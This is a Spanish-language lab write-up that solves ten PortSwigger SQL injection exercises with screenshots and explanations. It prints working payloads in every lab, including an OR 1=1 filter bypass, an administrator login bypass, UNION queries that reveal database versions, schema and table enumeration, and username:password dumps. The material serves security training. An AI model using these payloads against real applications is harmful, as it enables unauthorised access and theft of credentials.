---
title: SQL Injection
description: La inyección SQL (SQLi) es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos. Esto puede permitir que un atacante vea datos a los que normalmente no podría acceder.
date: 2024-10-16
toc: true
pin: false
image:
 path: /assets/img/ps-writeup-sqli/portswigger_websecurityacademy_logo.jpeg
categories:
  - Labs
tags:
  - port swigger
  - sqli
---

### SQL Injection

#### Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

![](/assets/img/ps-writeup-sqli/ps-lab1_1.png)

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Esta consulta busca todos los registros en la tabla "products" donde la columna "category" es igual a "Gifts" y la columna "released" es igual a "1".

Si se introduce (' OR 1=1-- -) de la siguiente manera:

```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1;
```
La consulta resultante puede devolver todos los productos en la tabla "products", y no solo los de la categoría "Gifts".

* ':	Cierra la cadena para category.

* OR 1=1:	Esta condición siempre es verdadera, ya que 1 siempre es igual a 1, lo que significa que se seleccionarán todos los productos sin importar la categoría.

* -- -:	Este es un comentario en SQL que ignora cualquier parte posterior de la consulta, por lo que la condición sobre "released" también queda sin verificar.

![](/assets/img/ps-writeup-sqli/ps-lab1_2.png)

<https://portswigger.net/web-security/sql-injection#retrieving-hidden-data>

<https://portswigger.net/web-security/sql-injection/cheat-sheet>

#### Lab 2: SQL injection vulnerability allowing login bypass

This lab contains a SQL injection vulnerability in the login function.
To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.

![](/assets/img/ps-writeup-sqli/ps-lab2_1.png)

En este caso se debe iniciar sesion bypaseando la contraseña. La web comprueba las credenciales realizando la siguiente consulta SQL:

```sql
SELECT * FROM users WHERE username = '' AND password = ''
```

Es posible iniciar sesión como cualquier usuario sin necesidad de una contraseña.

```sql
administrator'--
```

Esta injeccion altera la query comentando (AND password = ''). Por lo tanto, la parte que verifica la contraseña se omite. Aunque es importante que el usuario sea valido.

![](/assets/img/ps-writeup-sqli/ps-lab2_2.png)

![](/assets/img/ps-writeup-sqli/ps-lab2_3.png)

La consulta final seria:

```sql
SELECT name FROM users WHERE username = 'administrator'--'
```

<https://portswigger.net/web-security/sql-injection#subverting-application-logic>

<https://portswigger.net/web-security/sql-injection/cheat-sheet>

#### Lab 3: SQL injection attack, querying the database type and version on Oracle

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
To solve the lab, display the database version string.

![](/assets/img/ps-writeup-sqli/ps-lab3_1.png)

Es posible identificar tanto el tipo como la versión de la base de datos inyectando consultas específicas.

```sql
' union select NULL,NULL from dual--
```
En el caso de Oracle, de debe indicar una tabla en todo momento, 'dual' es una tabla presente de manera predeterminada.

Esta consulta permite verificar si la inyección puede ser exitosa.

![](/assets/img/ps-writeup-sqli/ps-lab3_2.png)

Y con la siguiente consulta se puede obtener la versión de la base de datos

```sql
' union select NULL,banner from v$version--
```

![](/assets/img/ps-writeup-sqli/ps-lab3_3.png)

![](/assets/img/ps-writeup-sqli/ps-lab3_4.png)

<https://portswigger.net/web-security/sql-injection#examining-the-database>

<https://portswigger.net/web-security/sql-injection/examining-the-database>

<https://portswigger.net/web-security/sql-injection/cheat-sheet>

#### Lab 4: SQL injection attack, querying the database type and version on MySQL and Microsoft

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

![](/assets/img/ps-writeup-sqli/ps-lab4_1.png)

Ahora, en el caso de MySQL y Microsoft, no es necesario indicar una tabla.

```sql
' union select NULL,NULL-- -
```

![](/assets/img/ps-writeup-sqli/ps-lab4_2.png)

Para determinar la base de datos, se utiliza esta query:

```sql
' union select NULL,@@version-- -
```

![](/assets/img/ps-writeup-sqli/ps-lab4_3.png)

![](/assets/img/ps-writeup-sqli/ps-lab4_4.png)

<https://portswigger.net/web-security/sql-injection#examining-the-database>

<https://portswigger.net/web-security/sql-injection/examining-the-database>

<https://portswigger.net/web-security/sql-injection/cheat-sheet>

#### Lab 5: SQL injection attack, listing the database contents on non-Oracle databases

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

![](/assets/img/ps-writeup-sqli/ps-lab5_1.png)

```sql
' union select NULL,NULL--
```

![](/assets/img/ps-writeup-sqli/ps-lab5_2.png)

La mayoría de los tipos de bases de datos (excepto Oracle) cuentan con lo denominado "esquema de información" (information schema), que proporciona información sobre la base de datos.

Es posible hacer una consulta para listar, en este caso, la base de datos.

* schema_name: Se refiere a la columna que contiene los nombres de los schemas en (information_schema.schemata).

* information_schema: Es un schema que contiene metadatos sobre la base de datos, incluyendo tablas, columnas, y schemas.

```sql
' union select NULL,schema_name from information_schema.schemata--
```

![](/assets/img/ps-writeup-sqli/ps-lab5_3.png)

Ahora, en vez de listar solo por la base de datos, se puede filtrar por el schema 'public' esto deberia devolver una lista de los nombres de las tablas en ese schema.

* table_name: Se refiere a la columna que contiene los nombres de las tablas.

* information_schema.tables: Contiene información sobre todas las tablas en la base de datos.

* WHERE table_schema='public': Filtra las tablas para que solo se devuelvan aquellas que están en el schema 'public'.

```sql
' union select NULL,table_name from information_schema.tables where table_schema='public'--
```

![](/assets/img/ps-writeup-sqli/ps-lab5_4.png)

Con la misma logica anterior, a medida que voy encontrando nueva informacion, la utilizo para llegar a dumpear datos sensibles.

* column_name: Se refiere a la columna que contiene los nombres de las columnas en una tabla.

* information_schema.columns: Este schema contiene información sobre todas las columnas de las tablas en la base de datos.

* AND table_name='users_xvjqcx': Filtra para obtener solo las columnas de la tabla específica llamada 'users_xvjqcx'.

```sql
' union select NULL,column_name from information_schema.columns where table_schema='public' AND table_name='users_xvjqcx'--
```

![](/assets/img/ps-writeup-sqli/ps-lab5_5.png)

Conociendo el valor de las columnas donde se guardan los usuarios y la contraseñas, se puede hacer la siguiente query:

```sql
' union select NULL,concat(username_mzomwc,':',password_rvltqt) from users_xvjqcx--
```

![](/assets/img/ps-writeup-sqli/ps-lab5_6.png)

Esta consulta está diseñada para recuperar tanto el nombre de usuario como la contraseña de la tabla 'users_xvjqcx' y devolverlos en un solo valor concatenado.

![](/assets/img/ps-writeup-sqli/ps-lab5_7.png)

![](/assets/img/ps-writeup-sqli/ps-lab5_8.png)

<https://portswigger.net/web-security/sql-injection/union-attacks>

<https://portswigger.net/web-security/sql-injection/examining-the-database#listing-the-contents-of-the-database>

<https://portswigger.net/web-security/sql-injection/union-attacks#using-a-sql-injection-union-attack-to-retrieve-interesting-data>

<https://portswigger.net/web-security/sql-injection/cheat-sheet>

#### Lab 6: SQL injection attack, listing the database contents on Oracle

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

![](/assets/img/ps-writeup-sqli/ps-lab6_1.png)

```sql
' union select NULL,NULL from dual--
```

![](/assets/img/ps-writeup-sqli/ps-lab6_2.png)

Esta consulta, sirve para recibir informacion sobre todas las tablas accesibles en una base de datos Oracle.

```sql
' union select table_name,NULL from all_tables--
```

![](/assets/img/ps-writeup-sqli/ps-lab6_3.png)

![](/assets/img/ps-writeup-sqli/ps-lab6_4.png)

La idea con la siguiente query, es intentar obtener información sobre los propietarios de las tablas.

```sql
' union select owner,NULL from all_tables--
```

![](/assets/img/ps-writeup-sqli/ps-lab6_5.png)

![](/assets/img/ps-writeup-sqli/ps-lab6_6.png)

De esta forma dumpeo las tablas donde el usuario 'PETER' es propietario.

```sql
' union select table_name,NULL from all_tables where owner='PETER'--
```

![](/assets/img/ps-writeup-sqli/ps-lab6_7.png)

![](/assets/img/ps-writeup-sqli/ps-lab6_8.png)

Lo mismo que antes, enumerar columnas y concatenar los datos.

```sql
' union select column_name,NULL from all_tab_columns where table_name='USERS_ALOPDA'--
```

![](/assets/img/ps-writeup-sqli/ps-lab6_9.png)

![](/assets/img/ps-writeup-sqli/ps-lab6_10.png)

```sql
' union select USERNAME_KSODRZ||':'||PASSWORD_YYUEIR,NULL from USERS_ALOPDA--
```

Por ultimo dumpeo la infomacion de las columnas (USERNAME_KSODRZ) y (PASSWORD_YYUEIR), que estan dentro de la tabla (USERS_ALOPDA).

![](/assets/img/ps-writeup-sqli/ps-lab6_11.png)

![](/assets/img/ps-writeup-sqli/ps-lab6_12.png)

![](/assets/img/ps-writeup-sqli/ps-lab6_13.png)

![](/assets/img/ps-writeup-sqli/ps-lab6_14.png)

<https://portswigger.net/web-security/sql-injection#retrieving-data-from-other-database-tables>

<https://portswigger.net/web-security/sql-injection/union-attacks>

<https://portswigger.net/web-security/sql-injection/examining-the-database#listing-the-contents-of-the-database>

<https://portswigger.net/web-security/sql-injection/cheat-sheet>

#### Lab 7:SQL injection UNION attack, determining the number of columns returned by the query

 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

![](/assets/img/ps-writeup-sqli/ps-lab7_1.png)

Cuando se realiza una inyección SQL de tipo UNION, hay dos métodos efectivos para determinar cuántas columnas se devuelven de la consulta original.

Una forma de determinar el número de columnas en la consulta original es usando la cláusula ORDER BY.

* ORDER BY: Permite probar la cantidad de columnas al intentar ordenar por ellas, detectando errores cuando el número excede el total de columnas disponibles.

```sql
' order by 3--
```

![](/assets/img/ps-writeup-sqli/ps-lab7_3.png)

La otra forma, es usando el operador UNION, se usa para combinar los resultados de dos o más consultas. Para que esto funcione, ambas consultas deben devolver el mismo número de columnas.

* UNION SELECT: Permite intentar diferentes números de columnas hasta encontrar la cantidad correcta.

* NULL: Hace referncia a valor nulo. Se usa para llenar un campo si no se está seleccionando un valor específico.

```sql
' union select NULL,NULL,NULL--
```

![](/assets/img/ps-writeup-sqli/ps-lab7_4.png)

<https://portswigger.net/web-security/sql-injection/union-attacks#determining-the-number-of-columns-required>

<https://portswigger.net/web-security/sql-injection/cheat-sheet>

#### Lab 8: SQL injection UNION attack, finding a column containing text

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

![](/assets/img/ps-writeup-sqli/ps-lab8_1.png)

Una vez que se conoce cuántas columnas devuelve la consulta original, se puede probar cada columna para ver si puede contener datos de tipo cadena.

Esto permite determinar cuál de las columnas puede aceptar datos de tipo cadena. En este caso, el segundo campo es injectable.

```sql
' union select NULL,'TYl4it',NULL--
```

![](/assets/img/ps-writeup-sqli/ps-lab8_3.png)

<https://portswigger.net/web-security/sql-injection/union-attacks#finding-columns-with-a-useful-data-type>

<https://portswigger.net/web-security/sql-injection/cheat-sheet>

#### Lab 9: SQL injection UNION attack, retrieving data from other tables

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

![](/assets/img/ps-writeup-sqli/ps-lab9_1.png)

Puedo intuir que existen dos columnas en la categoria 'Tech gifts', una columna para los titulos y otra para los textos.

![](/assets/img/ps-writeup-sqli/ps-lab9_2.png)

Por tanto, la siguiente query debe ser valida:

```sql
' union select NULL,NULL--
```

![](/assets/img/ps-writeup-sqli/ps-lab9_3.png)

Ambos campos son injectables.

```sql
' union select 'test',NULL--
```

```sql
' union select NULL,'test'--
```

![](/assets/img/ps-writeup-sqli/ps-lab9_4.png)

![](/assets/img/ps-writeup-sqli/ps-lab9_5.png)

Lo que sigue seria listar schemas, tablas y columnas.

```sql
' union select NULL,schema_name from information_schema.schemata--
```

![](/assets/img/ps-writeup-sqli/ps-lab9_6.png)

```sql
' union select NULL,table_name from information_schema.tables
```

![](/assets/img/ps-writeup-sqli/ps-lab9_7.png)

```sql
' union select NULL,table_name from information_schema.tables where table_schema='public'--
```

![](/assets/img/ps-writeup-sqli/ps-lab9_8.png)

```sql
' union select NULL,column_name from information_schema.columns where table_schema='public' and table_name='users'--
```

![](/assets/img/ps-writeup-sqli/ps-lab9_9.png)

Dado que ambas columnas son injectables puedo utilizar esta query.

```sql
' union select username,password from users--
```

![](/assets/img/ps-writeup-sqli/ps-lab9_10.png)


![](/assets/img/ps-writeup-sqli/ps-lab9_12.png)

![](/assets/img/ps-writeup-sqli/ps-lab9_13.png)

<https://portswigger.net/web-security/sql-injection/union-attacks>

<https://portswigger.net/web-security/sql-injection/cheat-sheet>

#### Lab 10: SQL injection UNION attack, retrieving multiple values in a single column

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

![](/assets/img/ps-writeup-sqli/ps-lab10_1.png)

Lo mismo de antes.

```sql
' union select NULL,NULL--
```

![](/assets/img/ps-writeup-sqli/ps-lab10_2.png)

```sql
' union select NULL,schema_name from information_schema.schemata--
```

![](/assets/img/ps-writeup-sqli/ps-lab10_3.png)

```sql
' union select NULL,table_name from information_schema.tables where table_schema='public'--
```

![](/assets/img/ps-writeup-sqli/ps-lab10_4.png)

```sql
' union select NULL,column_name from information_schema.columns where table_schema='public' and table_name='users'--
```

![](/assets/img/ps-writeup-sqli/ps-lab10_5.png)

En este caso se debe concatenar los valores, ya que solo cuento con una única columna.

La sintaxis puede variar dependiendo del tipo de base de datos.

```sql
' union select NULL,concat(username,':',password) from users--
```

![](/assets/img/ps-writeup-sqli/ps-lab10_6.png)

![](/assets/img/ps-writeup-sqli/ps-lab10_7.png)

![](/assets/img/ps-writeup-sqli/ps-lab10_8.png)

<https://portswigger.net/web-security/sql-injection/union-attacks>

<https://portswigger.net/web-security/sql-injection/union-attacks#retrieving-multiple-values-within-a-single-column>

<https://portswigger.net/web-security/sql-injection/cheat-sheet>

